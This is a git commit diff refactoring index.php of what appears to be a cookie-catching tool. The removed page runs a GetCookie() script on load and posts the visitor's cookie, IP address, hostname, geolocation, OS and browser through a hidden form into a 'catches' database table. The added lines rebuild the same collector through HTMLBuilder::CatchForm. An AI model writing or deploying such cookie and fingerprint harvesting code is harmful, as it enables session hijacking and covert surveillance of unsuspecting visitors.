3f7a4d24ab09a3e9ba6e93de8ba788b38aa9ba7a
4xx404 <45526353+4xx404@users.noreply.github.com>
2022-04-23 20:40:03 +0100

    Update index.php

--- index.php
+++ index.php
@@ -3,16 +3,6 @@
 
 	$Database = new Database();
 
-	$IPAddress = Client::GetIP();
-
-	$UserAgent = Client::GetUserAgent();
-	$LocalHostName = gethostname();
-	$HostName = gethostbyaddr($IPAddress);
-	$Location = Client::GetLocation($IPAddress);
-
-	$OS = Client::GetOS($UserAgent);
-	$Browser = Client::GetBrowser($UserAgent);
-
 	if(Input::Exists()) {
 		$Data = array(
 			"id" => Hash::Make(),
@@ -30,26 +20,9 @@
 
 		$Database::Insert("catches", $Data);
 	}
+
+	$IPAddress = Client::GetIP();
+	
+	HTMLBuilder::CatchHead();
+	HTMLBuilder::CatchForm($IPAddress, Client::GetLocation($IPAddress), Client::GetUserAgent());
 ?>
-<!DOCTYPE html>
-<head>
-	<title></title>
-	<script src="JavaScript/Generic.js"></script>
-</head>
-<body onload="GetCookie();">
-	<form id="catch-form" id="catch-form" method="post" action="">
-		<input type="text" name="cookie-value" id="cookie-value" hidden />
-		<input type="text" name="decoded-cookie" id="decoded-cookie" hidden />
-
-		<input type="text" name="ip-address" id="ip-address" value="<?php echo ($IPAddress !== null) ? $IPAddress : "Unknown IP Address"; ?>" hidden />
-		<input type="text" name="user-agent" id="user-agent" value="<?php echo ($UserAgent !== null) ? $UserAgent : "Unknown User Agent"; ?>" hidden />
-		<input type="text" name="local-hostname" id="local-hostname" value="<?php echo ($LocalHostName !== false) ? $LocalHostName : "Unknown Local Hostname"; ?>" hidden />
-		<input type="text" name="hostname" id="hostname" value="<?php echo ($HostName !== false) ? $HostName : "Unknown Host Name"; ?>" hidden />
-		<input type="text" name="location" id="location" value="<?php echo ($Location !== null) ? $Location['full_location'] : "Unknown Location"; ?>" hidden />
-		<input type="text" name="client-os" id="client-os" value="<?php echo ($OS !== null) ? $OS : "Unknown OS"; ?>" hidden />
-		<input type="text" name="client-browser" id="client-browser" value="<?php echo ($Browser !== null) ? $Browser : "Unknown Browser"; ?>" hidden />
-	</form>
-
-	<button form="catch-form" name="submit" id="submit" style="display:none;"></button>
-</body>
-</html>
